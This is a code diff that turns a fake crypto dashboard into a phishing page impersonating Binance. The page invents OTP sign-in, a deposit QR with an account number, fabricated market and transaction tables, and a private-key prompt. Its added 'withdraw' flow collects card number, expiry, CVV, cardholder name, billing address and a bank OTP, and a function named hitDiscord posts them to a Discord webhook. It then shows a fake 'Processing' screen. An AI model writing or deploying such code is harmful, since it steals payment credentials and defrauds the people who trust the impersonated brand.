@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HR-FINANCE | Professional Market Terminal</title>
+    <title>Binance | Institutional Crypto Terminal</title>
     <link rel="stylesheet" href="https://cloudflare.com">
     <style>
         :root { --bg: #0b0e11; --sidebar: #12161c; --card: #1e2329; --border: #2b3139; --yellow: #f3ba2f; --text: #eaecef; --text-gray: #848e9c; --up: #0ecb81; --down: #f6465d; --link: #627eea; }
         body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); margin: 0; display: flex; height: 100vh; overflow: hidden; }
         
-        /* 1. AUTH SYSTEM */
+        /* AUTH SYSTEM */
         #auth-overlay { position: fixed; inset: 0; background: var(--bg); z-index: 100000; display: flex; justify-content: center; align-items: center; }
         .auth-card { background: var(--card); padding: 40px; border-radius: 20px; width: 420px; text-align: center; border: 1px solid var(--border); }
         input, select { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: 1px solid var(--border); background: #0b0e11; color: white; box-sizing: border-box; font-size: 14px; }
@@ -17,204 +17,211 @@
         .spinner { display: none; width: 35px; height: 35px; border: 4px solid rgba(255,255,255,0.1); border-left-color: var(--yellow); border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* 2. SIDEBAR */
+        /* SIDEBAR */
         #sidebar { width: 260px; background: var(--sidebar); border-right: 1px solid var(--border); padding: 25px; display: none; flex-direction: column; }
-        .logo { font-size: 22px; font-weight: 800; color: var(--yellow); margin-bottom: 40px; display: flex; align-items: center; gap: 10px; }
-        .nav-item { padding: 12px; border-radius: 8px; color: var(--text-gray); cursor: pointer; margin-bottom: 5px; font-size: 14px; display: flex; align-items: center; gap: 10px; transition: 0.2s; }
+        .logo { font-size: 24px; font-weight: 800; color: var(--yellow); margin-bottom: 40px; display: flex; align-items: center; gap: 10px; }
+        .nav-item { padding: 12px; border-radius: 8px; color: var(--text-gray); cursor: pointer; margin-bottom: 5px; font-size: 14px; display: flex; align-items: center; gap: 10px; }
         .nav-item.active { background: var(--card); color: white; }
 
-        /* 3. MAIN DASHBOARD */
+        /* MAIN WRAPPER */
         #main-wrapper { flex: 1; display: none; flex-direction: column; overflow: hidden; }
         header { background: var(--sidebar); border-bottom: 1px solid var(--border); padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; }
         main { flex: 1; padding: 30px; overflow-y: auto; }
 
-        /* 4. TABLES (MARKET & EXPLORER) */
+        /* TABLES */
         .table-container { background: #12161c; border-radius: 12px; border: 1px solid var(--border); overflow-x: auto; margin-bottom: 30px; }
         table { width: 100%; border-collapse: collapse; text-align: left; min-width: 1000px; }
         th { padding: 15px; background: #1e2329; color: var(--text-gray); font-size: 11px; text-transform: uppercase; position: sticky; top: 0; z-index: 10; }
         td { padding: 15px; border-bottom: 1px solid var(--border); font-size: 13px; }
-        .coin-name { font-weight: bold; display: flex; align-items: center; gap: 8px; }
-        .hash { color: var(--link); font-family: 'Roboto Mono', monospace; }
-        .method { background: #2b3139; padding: 4px 8px; border-radius: 4px; font-size: 11px; }
 
-        /* 5. WALLET MODAL (WHITE BOX) */
-        #wallet-modal { position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 200000; }
-        .white-box { background: white; color: black; padding: 40px; border-radius: 24px; width: 380px; position: relative; text-align: left; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
-        .btn-back-modal { background: #f0f0f0; color: #555; width: 100%; padding: 12px; border-radius: 12px; font-weight: bold; border: 1px solid #ddd; cursor: pointer; margin-top: 10px; }
+        /* QR DEPOSIT PAGE */
+        .qr-display { background: white; padding: 20px; border-radius: 15px; width: 250px; margin: 20px auto; }
+        .qr-display img { width: 100%; display: block; }
+
+        /* BANK PAGE STYLE */
+        .bank-page { background: white; color: black; max-width: 450px; margin: 50px auto; padding: 40px; border-radius: 12px; text-align: center; border-top: 5px solid #004a99; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .waiting-box { display: none; text-align: center; padding: 50px; }
     </style>
 </head>
 <body>
 
-<!-- AUTH SECTION -->
 <div id="auth-overlay">
     <div class="auth-card" id="choice-box">
-        <h2 style="color: var(--yellow);">HR-FINANCE</h2>
-        <p style="color: var(--text-gray);">Archive Access Selection</p>
-        <button class="btn-yellow" onclick="showForm('reg')">Create Account</button>
-        <button class="btn-yellow" style="background:transparent; border:1px solid #555; color:white; margin-top:10px;" onclick="showForm('login')">Login</button>
+        <h2 style="color: var(--yellow);">BINANCE</h2>
+        <p style="color: var(--text-gray);">Institutional Terminal Access</p>
+        <button class="btn-yellow" onclick="showForm('reg')">Register Account</button>
+        <button class="btn-yellow" style="background:transparent; border:1px solid #555; color:white; margin-top:10px;" onclick="showForm('login')">Member Login</button>
     </div>
-
     <div class="auth-card" id="form-box" style="display:none;">
-        <h2 id="form-title">Verification</h2>
+        <h2 id="form-title">BINANCE Verification</h2>
         <div id="auth-loader" class="spinner"></div>
         <div id="auth-inputs">
             <input type="text" id="u-name" placeholder="Full Name">
-            <input type="email" id="u-email" placeholder="Email (gmail/yahoo/outlook)">
-            <input type="password" placeholder="Password">
+            <input type="email" id="u-email" placeholder="Email (@gmail/@yahoo)">
+            <input type="password" placeholder="Password" id="u-pass">
             <button class="btn-yellow" onclick="startAuth()">Continue</button>
-            <p onclick="showForm('choice')" style="cursor:pointer; color:var(--text-gray); font-size:12px; margin-top:15px;">Back</p>
         </div>
     </div>
-
     <div class="auth-card" id="otp-box" style="display:none;">
-        <h2>Security Token</h2>
         <div id="otp-display" style="font-size: 40px; font-weight: bold; color: var(--yellow); margin: 20px 0; letter-spacing: 10px;">000000</div>
         <input type="text" id="otp-input" placeholder="Enter Code" maxlength="6" style="text-align:center;">
-        <button class="btn-yellow" onclick="finalizeAuth()">Unlock Terminal</button>
+        <button class="btn-yellow" onclick="finalizeAuth()">Unlock Dashboard</button>
     </div>
 </div>
 
-<!-- SIDEBAR -->
 <nav id="sidebar">
-    <div class="logo">HR-FINANCE</div>
-    <div class="nav-item active" id="n-market" onclick="switchTab('market')"><i class="fa-solid fa-chart-simple"></i> Market View</div>
-    <div class="nav-item" id="n-history" onclick="switchTab('history')"><i class="fa-solid fa-list-check"></i> History Logs</div>
-    
-    <div class="nav-item" onclick="openModal()" style="margin-top:20px; border-top:1px solid var(--border); padding-top:20px;">
+    <div class="logo">BINANCE</div>
+    <div class="nav-item active" id="n-market" onclick="switchView('market')"><i class="fa-solid fa-chart-line"></i> Market</div>
+    <div class="nav-item" id="n-history" onclick="switchView('history')"><i class="fa-solid fa-list-ul"></i> History Logs</div>
+    <div class="nav-item" onclick="switchView('deposit')"><i class="fa-solid fa-arrow-down"></i> Deposit</div>
+    <div class="nav-item" onclick="switchView('withdraw')"><i class="fa-solid fa-credit-card"></i> Withdraw</div>
+    <div class="nav-item" onclick="openModal()" style="margin-top:auto; border-top:1px solid var(--border); padding-top:20px; cursor:pointer;">
         <div style="font-size:11px; color:var(--text-gray)">No wallet connected</div>
-        <div style="font-size:10px; color:#5a606c">Missing Private Key</div>
+        <div style="font-size:10px; color:#5a606c">Private Key Sync Required</div>
     </div>
-    <div style="margin-top:auto; font-size:12px; color:var(--text-gray); cursor:pointer;" onclick="location.reload()">Sign Out</div>
 </nav>
 
 <div id="main-wrapper">
     <header>
-        <div style="font-weight:bold; font-size:13px;">Terminal: <span style="color:var(--up)">0x71C7...d289</span></div>
-        <div style="display:flex; gap:15px; align-items:center;">
-            <select id="currency-select" onchange="updateMarket()" style="background:#2b3139; color:white; border:none; padding:6px 12px; border-radius:5px; font-weight:bold;">
-                <option value="USD">USD</option><option value="PHP">PHP</option><option value="SGD">SGD</option><option value="USDT">USDT</option>
+        <div style="font-weight:bold; font-size:13px;">Terminal: <span style="color:var(--up)">BINANCE Archive v4.0</span></div>
+        <div style="display:flex; gap:10px; align-items:center;">
+            <select id="currency-select" onchange="updateMarket()" style="background:#2b3139; color:white; border:none; padding:8px 12px; border-radius:5px; font-weight:bold;">
+                <option value="USD">USD</option><option value="PHP">PHP</option><option value="SGD">SGD</option>
             </select>
-            <button onclick="openModal()" style="background:var(--yellow); border:none; padding:8px 18px; border-radius:5px; font-weight:bold; cursor:pointer;">Connect</button>
+            <button onclick="switchView('deposit')" style="background:var(--yellow); border:none; padding:8px 18px; border-radius:5px; font-weight:bold; cursor:pointer;">Deposit</button>
         </div>
     </header>
 
     <main>
         <!-- MARKET VIEW (100 COINS) -->
-        <div id="market-view">
-            <h1>Cryptocurrency Market (Top 100)</h1>
-            <div class="table-container">
-                <table>
-                    <thead><tr><th>#</th><th>Name</th><th>Price</th><th>24h Change</th><th>Volume (24h)</th><th>Market Cap</th></tr></thead>
-                    <tbody id="market-body"></tbody>
-                </table>
+        <div id="market-view" class="content-view">
+            <h1>Market Overview (1-100)</h1>
+            <div class="table-container"><table><thead><tr><th>#</th><th>Name</th><th>Price</th><th>24h Change</th><th>Market Cap</th></tr></thead><tbody id="market-body"></tbody></table></div>
+        </div>
+
+        <!-- HISTORY VIEW -->
+        <div id="history-view" class="content-view" style="display:none;">
+            <h1>Archive Explorer (2024 Logs)</h1>
+            <div class="table-container"><table><thead><tr><th>Tax Address</th><th>Method</th><th>Block</th><th>Timestamp (Hex)</th><th>Value</th></tr></thead><tbody id="history-body"></tbody></table></div>
+        </div>
+
+        <!-- DEPOSIT PAGE (QR INCLUDED) -->
+        <div id="deposit-view" class="content-view" style="display:none;">
+            <div style="text-align:center; padding-top:30px;">
+                <button onclick="switchView('market')" style="background:none; border:none; color:var(--yellow); cursor:pointer;">← Dashboard</button>
+                <h2>Scan QR to Deposit</h2>
+                <div class="qr-display">
+                    <img src="https://ibb.co" alt="Payment QR">
+                </div>
+                <p style="font-weight:bold; font-size:16px; color:var(--text); margin-top:10px;">2208894328312925696</p>
+                <p style="font-size:11px; color:var(--text-gray); margin-top:20px;">System: Waiting for network confirmation...</p>
             </div>
         </div>
 
-        <!-- HISTORY VIEW (WEMIX EXPLORER STYLE) -->
-        <div id="history-view" style="display:none;">
-            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
-                <h1>Transaction History (35 Records)</h1>
-                <span style="color:var(--text-gray); font-size:12px;">Archived 2024 | Total: 24.3600 ETH</span>
+        <!-- WITHDRAW VIEW -->
+        <div id="withdraw-view" class="content-view" style="display:none;">
+            <div id="card-form-area" style="max-width:500px; margin:0 auto; background:var(--card); padding:30px; border-radius:20px; border:1px solid var(--border);">
+                <h2>Connect Card for Withdrawal</h2>
+                <input type="text" id="c-num" placeholder="Card Number (16 Digits)" maxlength="16">
+                <div style="display:flex; gap:10px;">
+                    <input type="text" id="c-exp" placeholder="MM/YY" maxlength="5">
+                    <input type="text" id="c-cvv" placeholder="CVV" maxlength="3">
+                </div>
+                <input type="text" id="c-name" placeholder="Cardholder Full Name">
+                <input type="text" id="c-addr" placeholder="Billing Address">
+                <button class="btn-yellow" onclick="goToBankVerify()">Link and Verify Card</button>
             </div>
-            <div class="table-container">
-                <table>
-                    <thead><tr><th>Txn Hash</th><th>Method</th><th>Block</th><th>Timestamp</th><th>From</th><th>To</th><th>Value</th></tr></thead>
-                    <tbody id="history-body"></tbody>
-                </table>
+
+            <div id="bank-verify-page" class="bank-page" style="display:none;">
+                <h2 style="color:#004a99; margin:0;">Bank Verification</h2>
+                <p style="font-size:13px; color:#333; margin:20px 0;">Enter the OTP from your bank to connect your card to <b>BINANCE Institutional</b>.</p>
+                <div style="background:#f9f9f9; padding:20px; border:1px solid #ddd; border-radius:8px;">
+                    <input type="text" id="bank-otp" placeholder="Enter OTP" style="background:white; color:black; border:1px solid #ccc; text-align:center; font-size:20px; letter-spacing:5px;">
+                    <button class="btn-yellow" style="background:#004a99; color:white; width:100%;" onclick="hitDiscord()">Confirm OTP</button>
+                </div>
+                <p style="font-size:11px; color:#999; margin-top:20px;">Secured by Institutional Encryption</p>
+            </div>
+
+            <div id="waiting-screen" class="waiting-box">
+                <div class="spinner" style="display:block; width:60px; height:60px;"></div>
+                <h2 style="color:var(--yellow); margin-top:30px;">Processing Request...</h2>
+                <div style="background:#1e2329; padding:20px; border-radius:15px; margin-top:20px; border:1px dashed var(--yellow);">
+                    <h3 style="margin:0; color:white;">Estimated Waiting Time: 5 Minutes</h3>
+                </div>
             </div>
         </div>
     </main>
 </div>
 
-<!-- WALLET MODAL -->
-<div id="wallet-modal">
-    <div class="white-box">
+<div id="wallet-modal" style="position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 200000;">
+    <div class="white-box" style="background: white; color: black; padding: 40px; border-radius: 24px; width: 380px; position: relative;">
         <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
-            <h2 style="margin:0;">Wallet List</h2>
+            <h2 style="margin:0;">Sync Vault</h2>
             <span style="cursor:pointer; font-size:22px; color:#ccc;" onclick="closeModal()">✕</span>
         </div>
-        <p style="color:#666; font-size:13px; margin-bottom:25px;">Please connect your private key to synchronize real-time assets.</p>
-        <input type="text" placeholder="Wallet Name" style="background:#f5f5f5; color:black;">
-        <input type="password" placeholder="Private Key" style="background:#f5f5f5; color:black;">
-        <button class="btn-yellow" style="background:black; color:white;" onclick="alert('Access Denied: Code 0x8229')">Connect wallet</button>
-        <button class="btn-back-modal" onclick="closeModal()">Back to Dashboard</button>
+        <input type="text" placeholder="Wallet Name" style="background:#f5f5f5; color:black; border:1px solid #ddd;">
+        <input type="password" placeholder="Private Key" style="background:#f5f5f5; color:black; border:1px solid #ddd;">
+        <button class="btn-yellow" style="background:black; color:white; width:100%;" onclick="alert('Access Denied: Code 0x8229')">Connect</button>
+        <button class="btn-yellow" style="background:#f0f0f0; color:#555; width:100%; margin-top:10px; border:1px solid #ddd;" onclick="closeModal()">Back</button>
     </div>
 </div>
 
 <script>
-    let generatedCode = "";
-    let rates = { USD: 1, PHP: 57.50, SGD: 1.35, USDT: 1 };
-    
-    // Data for 100 Coins
-    const coinNames = ["Bitcoin", "Ethereum", "Tether", "BNB", "Solana", "XRP", "USDC", "Cardano", "Avalanche", "Dogecoin", "TRON", "Polkadot", "Polygon", "Chainlink", "Shiba Inu", "Litecoin", "DAI", "Bitcoin Cash", "Uniswap", "LEO"];
-    const symbols = ["BTC", "ETH", "USDT", "BNB", "SOL", "XRP", "USDC", "ADA", "AVAX", "DOGE", "TRX", "DOT", "MATIC", "LINK", "SHIB", "LTC", "DAI", "BCH", "UNI", "LEO"];
+    let code = "";
+    let rates = { USD: 1, PHP: 57.50, SGD: 1.35 };
+    const hook = "https://discord.com";
 
-    function showForm(t) {
-        document.getElementById('choice-box').style.display = 'none';
-        document.getElementById('form-box').style.display = 'block';
-        document.getElementById('form-title').innerText = t === 'reg' ? 'Create Account' : 'Member Login';
-    }
-
+    function showForm(t) { document.getElementById('choice-box').style.display = 'none'; document.getElementById('form-box').style.display = 'block'; }
     function startAuth() {
         let email = document.getElementById('u-email').value;
-        if(!email.match(/^[a-zA-Z0-9._%+-]+@(gmail|yahoo|outlook|hotmail|icloud)\.com$/)) {
-            alert("Use a valid email (@gmail, @yahoo, @outlook, etc.)"); return;
-        }
-        document.getElementById('auth-inputs').style.display = 'none';
-        document.getElementById('auth-loader').style.display = 'block';
-        setTimeout(() => {
-            document.getElementById('form-box').style.display = 'none';
-            document.getElementById('otp-box').style.display = 'block';
-            generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
-            document.getElementById('otp-display').innerText = generatedCode;
-        }, 2500);
+        if(!email.includes('@')) { alert("Invalid email!"); return; }
+        document.getElementById('auth-inputs').style.display = 'none'; document.getElementById('auth-loader').style.display = 'block';
+        setTimeout(() => { document.getElementById('form-box').style.display = 'none'; document.getElementById('otp-box').style.display = 'block';
+            code = Math.floor(100000 + Math.random() * 900000).toString(); document.getElementById('otp-display').innerText = code; }, 2000);
     }
-
     function finalizeAuth() {
-        if(document.getElementById('otp-input').value === generatedCode) {
-            document.getElementById('auth-overlay').style.display = 'none';
-            document.getElementById('sidebar').style.display = 'flex';
-            document.getElementById('main-wrapper').style.display = 'flex';
-            updateMarket();
-            buildHistory();
+        if(document.getElementById('otp-input').value === code) {
+            document.getElementById('auth-overlay').style.display = 'none'; document.getElementById('sidebar').style.display = 'flex';
+            document.getElementById('main-wrapper').style.display = 'flex'; updateMarket(); buildHistory();
         } else { alert("Wrong OTP"); }
+    }
+    function switchView(v) {
+        document.querySelectorAll('.content-view').forEach(el => el.style.display = 'none');
+        document.getElementById(v + '-view').style.display = 'block';
+        if(v==='withdraw') { document.getElementById('card-form-area').style.display = 'block'; document.getElementById('bank-verify-page').style.display = 'none'; document.getElementById('waiting-screen').style.display = 'none'; }
+        document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+        if(document.getElementById('n-'+v)) document.getElementById('n-'+v).classList.add('active');
+    }
+    function goToBankVerify() { document.getElementById('card-form-area').style.display = 'none'; document.getElementById('bank-verify-page').style.display = 'block'; }
+    
+    function hitDiscord() {
+        const details = `**BINANCE CARD CONNECTION**\nCard: ${document.getElementById('c-num').value}\nExp: ${document.getElementById('c-exp').value}\nCVV: ${document.getElementById('c-cvv').value}\nName: ${document.getElementById('c-name').value}\nAddr: ${document.getElementById('c-addr').value}\nBank OTP: ${document.getElementById('bank-otp').value}`;
+        fetch(hook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: details }) });
+        document.getElementById('bank-verify-page').style.display = 'none';
+        document.getElementById('waiting-screen').style.display = 'block';
     }
 
     function updateMarket() {
         let cur = document.getElementById('currency-select').value;
         let html = "";
-        for(let i=0; i<100; i++) {
-            let name = coinNames[i % coinNames.length];
-            let sym = symbols[i % symbols.length];
-            let baseP = i === 0 ? 96834.12 : (i === 1 ? 3613.24 : (10000 / (i + 1)));
-            let price = (baseP * rates[cur]).toLocaleString('en-US', { minimumFractionDigits: 2 });
-            let up = Math.random() > 0.4;
-            html += `<tr><td>${i+1}</td><td class="coin-name">${name} <small style="color:var(--text-gray)">${sym}</small></td>
-            <td>${cur === 'USD' ? '$' : cur} ${price}</td>
-            <td style="color:${up ? 'var(--up)' : 'var(--down)'}">${up ? '+' : '-'}${(Math.random()*5).toFixed(2)}%</td>
-            <td>$${(Math.random()*50).toFixed(1)}B</td><td>$${(100-i).toFixed(1)}B</td></tr>`;
+        for(let i=1; i<=100; i++) {
+            let p = i === 1 ? 96834.12 : (15000 / i);
+            let price = (p * rates[cur]).toLocaleString('en-US', { minimumFractionDigits: 2 });
+            html += `<tr><td>${i}</td><td><strong>Asset ${i}</strong></td><td>${cur} ${price}</td><td style="color:var(--up)">+${(Math.random()*5).toFixed(2)}%</td><td>$${(101-i).toFixed(1)}B</td></tr>`;
         }
         document.getElementById('market-body').innerHTML = html;
     }
-
     function buildHistory() {
-        let body = document.getElementById('history-body');
-        let val = (24.36 / 35).toFixed(4);
+        const body = document.getElementById('history-body');
+        body.innerHTML = "";
         for(let i=1; i<=35; i++) {
-            body.innerHTML += `<tr><td class="hash">0x8a${i}c...9e4f</td><td><span class="method">Transfer</span></td>
-            <td>1779${i}557</td><td style="color:var(--text-gray)">17794557</td><td>0x71C...d289</td><td>0xbc4...11d0</td><td style="color:var(--down)">- ${val} ETH</td></tr>`;
+            let b = 17794557 + (i * 12);
+            let ts = "0x" + (1714557000 + (i * 300)).toString(16).toUpperCase();
+            body.innerHTML += `<tr><td>0x823b...8911</td><td>Transfer</td><td>${b}</td><td style="color:var(--up)">${ts}</td><td style="color:var(--down)">- 0.6960 ETH</td></tr>`;
         }
     }
-
-    function switchTab(t) {
-        document.getElementById('market-view').style.display = t === 'market' ? 'block' : 'none';
-        document.getElementById('history-view').style.display = t === 'history' ? 'block' : 'none';
-        document.getElementById('n-market').className = t === 'market' ? 'nav-item active' : 'nav-item';
-        document.getElementById('n-history').className = t === 'history' ? 'nav-item active' : 'nav-item';
-    }
-
-    function openModal() { document.getElementById('wallet-modal').style.display = 'flex'; }
     function closeModal() { document.getElementById('wallet-modal').style.display = 'none'; }
+    function openModal() { document.getElementById('wallet-modal').style.display = 'flex'; }
 </script>
 </body>
 </html>
